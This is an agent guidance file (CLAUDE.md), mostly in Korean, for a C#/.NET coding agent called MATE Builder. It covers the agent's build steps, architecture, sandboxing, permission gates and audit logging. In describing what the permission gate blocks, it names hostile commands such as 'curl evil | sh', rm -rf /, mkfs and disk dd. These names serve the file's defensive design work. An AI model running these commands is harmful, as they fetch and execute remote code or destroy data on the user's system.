# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

# MATE Builder 프로젝트 지침 (moai-code 의 zai 브랜치)

Claude Code(OpenClaude 계열 에이전트)를 C#/.NET 10 으로 포팅한 코딩·문서 에이전트. CLI(`mate`) + TUI 가 동일한 코어(`QueryEngine`)를 공유한다. 프로바이더는 Z.ai·OpenAI·Claude·OpenRouter·vLLM 중 `/provider` 로 고른다(아래 "프로바이더"). 솔루션은 제품 13개 + 테스트 3개(xUnit) 프로젝트.

**이름 (2026-11-03, 1.4.0)**: 제품 이름은 **MATE Builder**, 실행 파일은 `mate`, 데이터 루트는 `~/.mate` 다(예전 Z.ai Code·`zaiCode`·`~/.zaicode`). 시작할 때 `AppPaths.MigrateLegacyHome` 이 `~/.zaicode` 를 `~/.mate` 로 옮기고 옛 자리에 링크를 남긴다. 사용자 눈에 보이는 이름만 바꿨다 — 네임스페이스·프로젝트(`MoaiCode.*`), 환경변수(`MOAI_*`·`ZAI_API_KEY`), 저장소·폴더 이름은 그대로다.

**문서 주의**: 루트의 `README.md`·`PROGRESS.md` 는 upstream moai-code(조직 서버·Avalonia GUI·`moai` 바이너리·v1.8.5) 기준이라 **이 브랜치와 안 맞는다** (GUI 프로젝트 없음, `~/.moai` 아닌 `~/.mate`). `docs/SERVER_TASK_*.md`·`GUI_*.md`·`HANDOFF_*.md` 도 제거된 조직 서버/GUI 이야기다. 이 브랜치의 진실은 이 파일과 코드.

**이 브랜치(`zai`)는 서버 의존이 없는 단일 코딩 에이전트다.** upstream moai-code 에 있던 조직 서버(open-moai) 연동 — 팀 공유 스킬 동기화, 조직 문서함/RecordDB 툴(`Org*`), 서버 로그인 플로우(`/login`), 서버 임베딩(`EmbeddingClient`) 과 그에 의존하던 RAG 툴, 서버 경유 `WebSearch`, Avalonia GUI — 는 모두 제거했다. **다시 추가하지 말 것.** 기본 프로바이더는 z.ai GLM Coding Plan(`https://api.z.ai/api/coding/paas/v4`)이고, 런처(`../mate`, 옛 이름 `../zaiCode` 는 이리로 넘기는 별칭)는 z.ai 키(`ZAI_API_KEY`)만 폴백으로 넣는다(2026-11-01 부터 모델·주소는 넣지 않음).

## 코딩 원칙: 재활용 우선 (DRY)

**이미 있는 코드를 먼저 찾아 재활용한다.** 새 로직을 쓰기 전에 같은 일을 하는 코드가 이미 있는지 확인하고, 있으면 그걸 쓴다. 복붙하거나 병렬 구현을 추가하려는 순간 멈추고 **공용 헬퍼로 추출**한다(예: 모델 선택 `ModelPicker`, 스킬 선택 `SkillPicker` — `/model`·`/skills` 가 공유). 병렬 사본은 표류·부패한다. **UI 위젯·선택 플로우·설정 저장은 한 곳에 두고 콜백으로 주입**할 것.

## 빌드 / 테스트 / 실행

**중요: `dotnet` 이 PATH 에 없다.** 사용자 설치 경로를 쓴다:

```bash
export DOTNET_ROOT="$HOME/.dotnet"; export PATH="$DOTNET_ROOT:$PATH"
# 또는 각 명령에서 dotnet 대신 ~/.dotnet/dotnet 사용
```

```bash
dotnet build MoaiCode.sln
dotnet test  MoaiCode.sln                       # 전체 (xUnit)

# 단일 테스트 프로젝트 / 단일 테스트
dotnet test tests/MoaiCode.Core.Tests
dotnet test tests/MoaiCode.Core.Tests --filter "FullyQualifiedName~OpenAiChatModelTests"
dotnet test MoaiCode.sln --filter "DisplayName~특정테스트이름"

dotnet run --project src/MoaiCode.Cli                          # 대화형 CLI/TUI
dotnet run --project src/MoaiCode.Cli -- run "이 저장소 요약"   # 헤드리스 1회
```

- 빌드가 hang 하면 VBCSCompiler 데드락 — `-p:UseSharedCompilation=false -nodeReuse:false` 로 우회.
- **프로바이더 접속 정보(종류·키·주소·모델)의 유일한 해석지점은 `src/MoaiCode.Config/ProviderResolver.cs`** — 결과(`ProviderProfile`)는 `ActiveProvider.Current`(Core)에 두고, 대화 모델·WebSearch·이미지 툴은 거기서만 읽는다(환경변수를 직접 읽지 말 것 — 규칙이 갈리면 한쪽만 조용히 죽는다). 프로바이더별 고정값(id·기본 주소·키 이름·기본 컨텍스트 창)은 `Core/ProviderCatalog.cs`, z.ai 전용 값(코딩 엔드포인트 화이트리스트·모델별 컨텍스트 창 표·비전 기본값)은 `Core/ZaiEndpoint.cs`.
- 키·모델이 없으면 `EchoChatModel` 로 폴백(오프라인 개발 가능, 상태줄 "Offline (/provider)").

## 멀티타깃 & 플랫폼 (자주 걸리는 부분)

- `Directory.Build.props` 가 모든 프로젝트에 `net10.0` 을 강제하되 **`MoaiCode.Cli` 만 예외**(멀티타깃 `net10.0;net10.0-windows`). props 는 프로젝트 본문보다 먼저 평가되므로 프로젝트 이름으로 분기한다.
- **Office COM 툴(`MoaiCode.Tools.Office`)은 Windows 전용** (`net10.0-windows`). Linux 에서는 **컴파일만** 되고 실행 검증 불가 — COM 관련 변경은 Windows 실기 검증이 필요하다. **CLI 는 이 프로젝트를 참조하지 않는다**(제거된 GUI 전용이었고, 현재 참조자는 `tests/MoaiCode.Office.Tests` 뿐이다).
- 패키지 버전은 **중앙 관리**(`Directory.Packages.props`, `ManagePackageVersionsCentrally=true`) — 개별 csproj 에 버전 쓰지 말 것. 이 파일엔 Avalonia 등 **제거된 GUI 용 항목이 남아 있다**(GUI 부활로 오해하지 말 것).
- `InvariantGlobalization=true` (단일 exe 크기↓). 그래서 로컬라이제이션은 위성 어셈블리/`CurrentUICulture` 대신 **명시적 언어코드 + 임베드 JSON** 을 쓴다(아래 참조).

## 아키텍처 (여러 파일에 걸친 큰 그림)

**핵심 루프 — `src/MoaiCode.Core/Agent/QueryEngine.cs`**: 모델 스트리밍 → 권한 게이트(`IPermissionGate`) → 툴 디스패치 → 결과 주입 → 재진입(멀티턴). 컨텍스트가 창의 ~70% 를 넘으면 선제 컴팩션하고, 원래 사용자 요청(`_goal`)을 재고정(re-anchor)해 표류를 막는다. mid-stream 끊김 재시도·max_turns 연장 로직도 여기.
- `Core` 는 `Config` 를 참조할 수 없다(순환). 그래서 진단 로그는 **CLI 가 `MoaiLog.Info` 를 `Action<string>` 으로 주입**한다.

**Bash 권한 규칙(세그먼트 판정)** — `MoaiCode.Config/PermissionRules.cs` + `MoaiCode.Core/Tools/PermissionRule.cs`: 복합 명령(`ls | tail`, `a && b`)은 allow 패턴이 명령 전체와 매치되지 않으므로, **세그먼트 전부** 가 allow 규칙 또는 내장 읽기 전용 명령(ls/cat/grep/head/tail/wc/find/sort/diff 등)으로 덮일 때만 자동 허용한다(`AllSegmentsAllowed`). 하나라도 걸리지 않으면 확인으로 넘어간다(`ls && curl evil | sh` 는 여전히 차단). **명령치환(`$(...)`, 백틱)·리다이렉션이 있으면 이 완화를 적용하지 않는다**(`SegmentsAreTrustworthy`) — 이 규칙을 건드릴 때 두 함수의 세트를 같이 고려할 것.

**파괴적 명령 권한 게이트 (2026-11-03 재정비, Bill 결정)** — `Cli/ModeAwarePermissionGate.cs` 가 단일 판정 지점. 세 등급: ① 하드 차단(`BashSecurity.Check`·`Rm.IsCriticalDelete`: rm -rf /·시스템 트리, mkfs, 디스크 dd, 전원, curl|sh) — 어떤 경우에도 실행 안 됨. ② **파괴적 명령**(`BashSecurity.DestructiveReason` + 실행할 스크립트 내용 `ScriptReason`: 재귀·와일드카드 rm, kubectl/oc/helm 변경, DDL/DML·FLUSHALL, systemctl·kill·방화벽·계정·디스크·cron, git 이력 버리기, terraform/ansible/pdsh, 시스템 파일 변경, eval·변수 명령·인터프리터로 파이프 등) — **모드(Act/AutoAct/permission=auto/MOAI_YES)·allow 규칙과 무관하게 사람이 매번 확인**(`ICriticalConfirmGate`, "항상 허용" 없음), 사람이 없으면 거부. ③ 원격 접속(ssh·kubectl exec·클러스터 접속) — 확인하되 신뢰 대상 allow 규칙으로 건너뜀(원격 명령 자체가 파괴적이면 ②). 배치 자동화는 **`--ignore-confirm`**(`mate run`·`-p`·stream-json 전용, 대화형은 무시)만이 ②를 통과시키며, 하드 차단·deny 규칙·Plan 모드는 그대로이고 확인 없이 지나간 쓰기·실행은 모두 감사 로그에 먼저 기록돼야 실행된다(기록 실패 = 거부). 명령 분해는 `Core/Tools/ShellCommand.cs` 하나를 rm 판정·deny 규칙·kubectl 동사 판정이 공유한다(래퍼 sudo/env/timeout/xargs, sh -c, eval, ssh host, docker/kubectl exec, $(…)·백틱 안쪽까지 명령 위치로 본다). deny 규칙은 래퍼·옵션을 건너뛰어 매치하고 모든 레이어(~/.claude·프로젝트 포함)에서 받는다. **`~/.claude/settings.json` 의 allow 규칙은 받지 않는다.** "항상 허용"은 옵션이 먼저 오거나(`kubectl -n x …`) 접속 대상·SQL 이 위험을 정하는 도구(psql·ansible·iptables 등)면 이 명령 그대로(`Bash(=…)`)만 저장한다. 분류기 입력은 JSON 문자열(울타리 위조 방지).

**격리 실행 (2026-11-03, Bill 결정 "격리 실행 추가")** — 명령 판정(아래 파괴적 명령 게이트)은 우회를 다 막을 수 없다(독립 검토 3회 모두 새 우회 발견). 그래서 **사람이 이 호출을 직접 승인하지 않은 셸 명령**(AutoAct·permission=auto·MOAI_YES·allow 규칙·분류기 통과)은 bubblewrap 격리 안에서 돈다(`Tools.Bash/Sandbox.cs`, 정책 `Core/Tools/SandboxPolicy.cs`): `/` 읽기 전용, 작업 폴더·빌드 캐시(~/.cache·~/.npm·~/.nuget/packages …)·`sandboxWritable`·세션 전용 /tmp(호스트 /tmp 의 tmux·ssh-agent 소켓을 가린다)만 쓰기, 최소 /dev(디스크 없음), 새 /proc(sysrq 막음), /run 비움(docker·systemd·D-Bus 소켓 차단, DNS 만 남김), PID·IPC·UTS·사용자 네임스페이스 분리, no_new_privs(sudo 불가), 네트워크는 공유. 사람이 승인한 호출과 `--ignore-confirm` 배치는 게이트가 `SandboxPolicy.AllowUnsandboxed(call.Id)` 로 표시해 호스트에서 돈다(BashTool 이 `ToolContext.ToolUseId` 로 꺼낸다). 모델은 `dangerously_disable_sandbox: true` 로 호스트 실행을 요청할 수 있고 그것은 파괴적 명령과 같은 확인을 거친다. 설정 `sandbox`: `auto`(기본, bwrap 이 동작하면 켬)·`required`(못 쓰면 사람이 승인하지 않은 명령은 안 돈다)·`off`, 사용자 레이어·`MOAI_SANDBOX` 만. 시작할 때 시험 실행(`Sandbox.Probe`). **네트워크 너머(DB·클러스터·ssh)는 격리가 지키지 못한다** — 그쪽은 명령 판정과 확인에 의존하고, DB 클라이언트·curl 메서드 인자가 변수면 묻는다. BashTool 은 이제 명령의 종료 코드를 보존한다(예전엔 cwd 마커 printf 가 0 을 덮어써 실패가 성공으로 보고됐다).

**감사 로그** — `Config/AuditLog.cs`, `~/.mate/logs/audit.jsonl`(0600, 한 줄 한 건, 오피스챗 5287033 형식 ts·tool·action·app·target·hash·outcome + user·host·session·pid·cwd·mode·approval·reason·tool_use_id). 파괴적 명령의 승인(approved→ok/error 두 줄)·거절(declined)·사람 없음(denied)·하드 차단(blocked)·deny 규칙, 그리고 --ignore-confirm 의 모든 쓰기·실행. 결과 줄은 `Core/Tools/ToolEvents.Completed`(모든 엔진·하위 에이전트가 툴 종료 시 호출)로 잇는다. target 의 비밀번호·토큰·카드번호(Luhn)·주민번호는 가린다. 보관 `auditRetentionDays`(기본 90, 0=영구, 시작할 때 정리). 테스트는 `TestAuditLogRedirect` 가 임시 파일로 돌린다.

**프론트엔드별 툴 셋이 다르다 — 이게 보안 경계다:**
- 툴 원장은 `MoaiCode.Tools/ToolRegistry.cs` 의 `BuiltIn`.
- **CLI**(`MoaiCode.Cli/AppBootstrap.cs`): `BuiltIn` + **`BashTool`** (전체 권한).

**프로바이더 (2026-11-01)** — `/provider` 로 Z.ai·OpenAI·Claude·OpenRouter·vLLM 중 고르고, API 키는 붙여넣기(화면엔 앞 8자만, `SecretPrompt`)로 받는다. 모델 목록 조회로 접속을 확인한 뒤에만 저장한다(실패·취소 시 아무것도 안 바꿈).
- 저장: 키는 `credentials.json` 에 프로바이더별(`ZAI_API_KEY`·`OPENAI_API_KEY`·`ANTHROPIC_API_KEY`·`OPENROUTER_API_KEY`·`VLLM_API_KEY`), 선택값은 `settings.json` 의 `activeProvider` + `providers.<id>.{model, visionModel, baseUrl(vLLM), contextWindow}`. 이 두 키는 **사용자 레이어(~/.mate)에서만** 읽는다(프로젝트 설정이 키를 다른 주소로 보내지 못하게). 예전 최상위 `provider`/`baseUrl`(upstream 서버 잔재)은 읽지 않는다.
- 우선순위: `--model` → 저장값 → 환경변수(키 폴백, z.ai 는 `MOAI_MODEL`/`ZAI_MODEL` 도) → 기본값. z.ai 외 프로바이더는 `MOAI_MODEL` 을 보지 않는다(옛 런처의 glm-5.3 이 새지 않게).
- `/model`: 대화 모델 → 이미지 분석 모델("사용 안 함" = 이미지 분석 툴 숨김) 순으로 고른다. 목록이 30개를 넘으면 검색어로 먼저 거른다(`ModelPicker`).
- 대화 중 교체는 `SwitchableChatModel` 의 안쪽만 바꾼다(엔진·하위 에이전트·위험 분류기가 같은 인스턴스를 쥠). 컨텍스트 창은 모델 목록이 알려 주면(OpenRouter `context_length`·vLLM `max_model_len`·Claude `max_input_tokens`) 함께 저장하고 `QueryEngine.SetContextWindow` 로 바로 반영, 아니면 z.ai 표 → 프로바이더 기본값(vLLM 32K 등). `/provider`·`/model` 은 모델을 고른 뒤 컨텍스트 창을 묻는다(`ModelPicker.AskContextWindow`) — Enter 는 목록 값 → 같은 모델에 저장된 값 → 기본값 순의 제안값, 숫자를 넣으면 그 값을 `providers.<id>.contextWindow` 에 저장(서버가 한도를 안 알려 주는 사내 vLLM 용). 최상위 `contextWindow` 로 고정했으면 묻지 않는다.

**모델 계층 — `MoaiCode.Providers`**: `ProviderFactory.Create(profile)` 가 `IChatModel` 을 만들고, `RetryingChatModel` 데코레이터가 pre-yield(첫 이벤트 전) 끊김을 지수 백오프 재시도한다. 전송 공용부(헤더 대기 상한·연결 실패 분류)는 `Http/StreamingHttp`.
- Z.ai·OpenAI·OpenRouter·vLLM = `OpenAiChatModel`(OpenAI 호환). 프로바이더별 차이: z.ai 만 `max_tokens` 고정·`tool_stream`, OpenAI 는 `max_completion_tokens`(MOAI_MAX_TOKENS 지정 시만), OpenRouter 는 `reasoning.effort`, 나머지는 `stream_options.include_usage`. 서버가 선택 필드를 400 으로 거부하면 빼고 재전송(모델별 기억).
- Claude = `Anthropic/AnthropicChatModel`(Messages API, 원시 HTTP). thinking 블록은 서명째 `ReasoningBlock`(Core)으로 받아 엔진이 어시스턴트 메시지 앞에 저장하고 다음 요청에 되돌려 보낸다(다른 프로바이더는 무시). 컴팩션 등으로 기록이 바뀌므로 `thinking.block_binding.prefix_mismatch_behavior=drop_block`(베타 `thinking-binding-controls-2026-08-01`)을 보낸다.

**WebSearch 는 대화 프로바이더의 내장 검색** (`MoaiCode.Tools/Web/WebSearchTool.cs` + `ProviderWebSearch.cs`): z.ai 는 chat/completions 에 `tools=[{type:web_search}]`(결과는 최상위 `web_search` 배열, 엔진 `MOAI_SEARCH_ENGINE`, 기본 `search-prime`), OpenAI 는 Responses API `web_search`, OpenRouter 는 `openrouter:web_search` 서버 툴, Claude 는 `web_search_20260209`(거부 시 `_20250305`) 서버 툴. 별도 검색 키 없음. vLLM 은 검색이 없어 툴을 숨긴다 — 프로바이더에 따라 쓸 수 없는 툴은 `IConditionalTool` 로 엔진이 요청마다 걸러 모델에게 보이지 않는다(이미지 생성은 Z.ai 전용, 이미지 분석은 비전 모델을 골랐을 때만). **`StreamJsonRunner`** (`MoaiCode.Cli`) 는 claude CLI 호환 `--output-format stream-json` / `--input-format stream-json` (NDJSON 영속 모드, `-p` 값을 없이) 프로토콜을 구현한다.

**/diff (Claude Code 이식, 2026-11-03)** — `MoaiCode.Tui/Diff/`: 첫 화면은 커밋 안 된 변경(`GitWorkingDiff`: `git diff HEAD` + 추적 안 하는 새 파일, merge·rebase 중엔 생략), ←/→ 로 이 실행의 턴별 변경(최근 턴부터), ↑/↓ 파일, Enter 상세(대체 화면이라 스크롤 가능), Esc 뒤로. 턴별 변경은 `Core/Diff/FileChangeJournal` — Edit·Write 가 쓸 때 전·후 내용을 `ToolContext.Changes` 로 남기고, REPL 이 요청마다 `BeginTurn`, 서브에이전트는 부모 기록부를 받는다. 셸로 바꾼 파일은 턴별 변경에 없다(현재 변경에는 보인다). 줄 diff 는 `Core/Diff/LineDiff`(Myers).

**오프라인 모드·사내 인프라 스킬 (2026-11-03)** — 망분리 사내망용. `settings.json` 의 `"offline": true`(사용자 레이어만, 저장소가 끄지 못함) 또는 `MOAI_OFFLINE=1` 이면 `Core/NetworkPolicy.Offline` 이 켜져 WebFetch·WebSearch·ImageFetch·ImageCreate 를 숨기고(`IConditionalTool`) 실행도 거절하며, ImageAnalysis 는 로컬 파일만 받는다. 시스템 프롬프트 환경 절에 "Network: OFFLINE" 을 적는다. 대화 모델 연결(사내 vLLM)과 셸 명령의 네트워크는 건드리지 않는다 — 그건 망이 막는다. 번들 스킬 v12 에 자체 저작 인프라·오프라인 스킬 9종(man-page-lookup·oracle-to-postgresql·postgresql-diagnostics·openshift-diagnostics·k8s-manifest-review·vllm-serving·financial-secure-code-review·external-code-intake·change-and-incident-runbook)이 있고, 인터넷 주소가 없어야 한다(`OfflineModeTests` 가 검사). Skill 툴은 폴더형 스킬 본문 앞에 스킬 폴더 경로를 붙여 `references/`·`scripts/` 를 찾게 한다.

**로컬 청킹 파이프라인(문서 검색)**: 로컬 청킹(`MoaiCode.Tools.OpenXml` 의 `ChunkBuild`/`TextChunker`) + 로컬 벡터(`.moai-chunks/*.vec` float32 + `vectors.json`, 포맷은 `docs/CHUNK_VEC_FORMAT.md`) + 오프라인 코사인 검색(`ChunkSearch`). **CLI 는 임베딩하지 않는다** — 질의 벡터는 외부 파이프라인이 만들어 넘긴다(z.ai Coding Plan 에 임베딩 모델이 없다).

**로컬라이제이션 — `MoaiCode.Localization`**: **기본(base) 언어는 영어다.** 원칙: 소스 코드의 사용자 노출 문자열 리터럴은 **반드시 영어로 작성**하고(하드코딩 한글 금지), **한국어는 사용자를 위한 번역 레이어**로 `Resources/ko.json` 에 둔다. `en.json` 이 base(진실의 원천), `ko.json` 은 그 번역. 접근은 `L10n.Get(key, args)` (`string.Format(InvariantCulture)`), 임베드 `Resources/en.json`+`ko.json`. 키 규칙 `cli.*`/`slash.*`/`common.*` — **문장을 키로 쓰지 않는다**. 언어 결정: 설정(`language`) → `MOAI_LANGUAGE` env → **기본 `en`**, 폴백 `en`→키. **한국어 사용자는 `language: ko`(설정) 또는 `MOAI_LANGUAGE=ko` 로 명시**한다(한국어권 배포본은 이 설정을 포함). 규칙 상세: `docs/LOCALIZATION.md`. **en/ko 키는 항상 완전 일치시킬 것.** (로그는 이와 별개로 항상 영어 ASCII — 아래 로깅 섹션.) **영어 UI 라벨은 첫 글자 대문자(sentence case)** — 예: "Selected", "No such rule". 단 **명령어 미러(`install:`/`uninstall:`), 프로그램 프리픽스(`mate:`), 괄호 상태(`(none)`), 기술 토큰/경로(`.mcp.json`)** 는 소문자 유지.

**설정 병합 순서**(뒤가 우선): `~/.claude/settings.json` → `~/.mate/settings.json` → `<workspace>/.claude/settings.json` → 환경변수. 자격증명은 `~/.mate/credentials.json`(Unix `0600`, `mate auth set` 으로 기록). 자격증명 파일을 **직접 읽지 말 것** — `FileCredentialStore` 를 경유.

**세션·메모리는 프로젝트(cwd)별로 스코핑**된다 (`src/MoaiCode.Core/Memory/ProjectMemory.cs`): `~/.mate/projects/<percent-encoded-cwd-slug>/{sessions,memory}`. 슬러그는 cwd 절대경로의 percent-encoding이며 git 탐색을 쓰지 않는다(구 형식 슬러그는 마이그레이션 처리). 경계 밖 파일을 임의로 지우지 말 것.

## 배포

- **CLI**: `./publish-win.sh` / `./publish-linux.sh` / `./publish-all.sh` → self-contained 단일 파일(`dist/<rid>/mate`) + SHA-256.

## 디렉터리 레이아웃

```text
src/
  MoaiCode.Core           에이전트 루프(QueryEngine), Messages, Security(권한·위험분류), Memory
  MoaiCode.Providers      Z.ai Chat Completions SSE, RetryingChatModel, EchoChatModel 폴백, ProviderFactory
  MoaiCode.Tools          툴 원장(ToolRegistry.BuiltIn): Files·Search·Web·Media·Tasks·Agent + PathSafety
  MoaiCode.Tools.Bash     BashTool + 명령 보안 정책(위험 분류)
  MoaiCode.Tools.OpenXml  Docx/Pptx/Xlsx 생성·편집·검사, ChunkBuild/Fetch/Search, 이미지 삽입
  MoaiCode.Tools.Office   Windows Office COM(PowerPoint/Excel) — net10.0-windows 전용
  MoaiCode.Mcp            MCP stdio + 스킬(SkillLoader)·플러그인 로더
  MoaiCode.Config         Settings(SettingsLoader 3단 병합), CredentialStore, PermissionRules, MoaiLog, ProxyConfig
  MoaiCode.Localization   L10n.Get + Resources/en.json(base)·ko.json
  MoaiCode.Persistence    Session/History/Checkpoint/Usage 저장(JSONL/JSON, ~/.mate)
  MoaiCode.Tui            Spectre.Console REPL(ReplApp), LineEditor, 슬래시 명령(Commands/), Input/(raw 모드 터미널 입력·VT 파서·bracketed paste), MVU
  MoaiCode.Cli            진입점·AppBootstrap(툴 셋 구성), HeadlessRunner, StreamJsonRunner, TUI
  MoaiCode.Sdk            공개 SDK 계약(MoaiCodeClient)
tests/
  MoaiCode.Core.Tests     Core+CLI+TUI+MCP 통합 테스트 대부분 (테스트는 주로 여기)
  MoaiCode.OpenXml.Tests  문서 생성/편집 왕복·레이아웃·인젝션 테스트
  MoaiCode.Office.Tests   STA 디스패처·COM 툴 계약 테스트
demo/                     단일 샘플(RewardCalculator.cs) — 에이전트 자기 테스트용
docs/                     로컬 청킹 벡터 포맷·로컬라이제이션 규칙 등 (SERVER_TASK_*/GUI_* 는 upstream 이야기)
dist/, publish/           게시 산출물(커밋하지 않는 빌드 결과)
scripts/                  현재 비어 있음
```

## 로깅 (Logging)
- **로그 출력은 반드시 영어(ASCII)로만 작성한다.** 한글 등 비-ASCII 문자를 로그 메시지에 넣지 말 것.
  - 이유: Windows 기본 코드페이지(CP949) 등 환경에서 로그 파일/콘솔이 깨지는 것을 방지.
  - 적용 대상: `MoaiLog`를 포함한 모든 로그 메시지, 예외 컨텍스트 문자열, 진단 출력.
  - 사용자 입력(요청 텍스트 등)은 비-ASCII일 수 있으므로 **원문을 로그에 넣지 말고** 길이·해시 등 ASCII 메타데이터로 대체한다.
  - 공용 로거는 `MoaiCode.Config.MoaiLog` (파일: `~/.mate/logs/mate.log`, 레벨은 `~/.mate/settings.json`의 `logLevel`).
